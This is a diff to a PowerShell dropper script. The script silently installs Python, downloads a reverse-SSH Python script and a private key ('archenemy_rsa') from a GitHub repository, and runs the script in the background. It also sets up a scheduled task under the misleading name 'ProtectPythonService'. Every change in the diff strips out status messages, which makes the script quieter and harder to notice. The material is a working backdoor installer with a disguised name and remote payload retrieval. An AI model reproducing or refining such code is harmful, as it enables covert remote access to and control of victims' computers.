@@ -10,25 +10,20 @@ if (-not $pythonPath) {
     $installerPath = "$env:TEMP\python_installer.exe"
 
     # Download the Python installer
-    Write-Output "Downloading Python installer..."
     Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath
 
     # Install Python silently
-    Write-Output "Installing Python..."
     Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait
 
     # Verify installation
     $pythonPath = Get-Command python -ErrorAction SilentlyContinue
     if ($pythonPath) {
-        Write-Output "[!] Python installed successfully."
     } else {
-        Write-Output "[x] Python installation failed."
     }
 
     # Clean up
     Remove-Item -Path $installerPath -Force
 } else {
-    Write-Output "[!] Python is already installed."
 }
 
 # Fetch the python executable path
@@ -40,7 +35,6 @@ $pythonPath = "$pythonPath\python.exe"
 
 # Download the python script directly with invoke-webrequest
 $outDirectory = "$env:TEMP"		# Temp directory in Windows
-Write-Output "[!] Temp directory: $outDirectory"
 
 $repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
 $requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
@@ -53,7 +47,6 @@ $contentPath = "${outDirectory}/archenemy_rsa"
 if (Test-Path $scriptPath) {
     # If it exists, delete it
     Remove-Item $scriptPath -Force
-    Write-Output "[!] File '$scriptPath' deleted."
 }
 
 
@@ -63,21 +56,16 @@ try {
 	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
 	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
 	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath
-    Write-Output "[!] Scripts downloaded successfully."
 
     # Install the Python packages from requirements.txt
-    Write-Output "[!] Installing Python packages..."
     & python -m pip install --upgrade pip *> $null
     & python -m pip install -r $requirementsPath *> $null
 
-    Write-Output "[!] Python packages installed successfully."
 
 } catch {
     # Check if the file already exists
     if (Test-Path -Path $scriptPath) {
-        Write-Output "[!] The file already exists at $scriptPath."
     } else {
-        Write-Output "[!] The file $scriptPath does not exist and could not be downloaded."
     }
 }
 
@@ -88,14 +76,11 @@ $TaskName = "ProtectPythonService"
 $scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
 
 if ($scheduledTask) {
-    Write-Output "[!] Task '$TaskName' exists. Deleting it now."
     
     # Delete the existing task
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
     
-    Write-Output "[!] Task '$TaskName' has been deleted."
 } else {
-    Write-Output "[!] Task '$TaskName' does not exist or has already been deleted."
 }
 
 
@@ -120,11 +105,9 @@ if (Test-Path -Path $scriptPath) {
 	#Start-Process -NoNewWindow "$pythonPath" "$scriptPath"
 	Start-Process -NoNewWindow -FilePath "$pythonPath" -ArgumentList "`"$scriptPath`""
     #Start-Process -FilePath "$pythonPath" -ArgumentList "$scriptPath" -WindowStyle Hidden
-    Write-Output "[*] Python script executed in the background!" 
 
 	# Execute the script
 	#& "$pythonPath" "$scriptPath" > $null 2>&1
 	#echo "[*] Python Script executed!"
 } else {
-    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
 }
